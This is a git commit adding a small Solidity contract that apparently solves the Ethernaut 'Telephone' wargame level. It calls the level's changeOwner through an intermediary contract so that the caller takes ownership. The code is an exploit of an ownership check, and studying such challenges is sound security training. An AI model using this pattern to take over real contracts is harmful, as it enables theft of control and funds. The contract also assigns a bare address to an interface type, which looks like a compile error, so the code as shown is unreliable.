1223e7ea1851eb6a283de124736ab2ff872efff4
mok <mok0230@protonmail.com>
2021-12-19 20:30:13 -0600

    create telephone contract

---
+++ contracts/Telephone.sol
@@ -0,0 +1,13 @@
+//SPDX-License-Identifier: Unlicense
+pragma solidity ^0.8.0;
+
+import "hardhat/console.sol";
+import "./interfaces/IEthernautTelephone.sol";
+
+contract Telephone {
+  IEthernautTelephone ethernautTelephone = 0xA647B0b9A046b833416cD6960370EbE010abEB83;
+
+  function changeEthernautTelephoneOwner() public {
+    ethernautTelephone.changeOwner(msg.sender);
+  }
+}
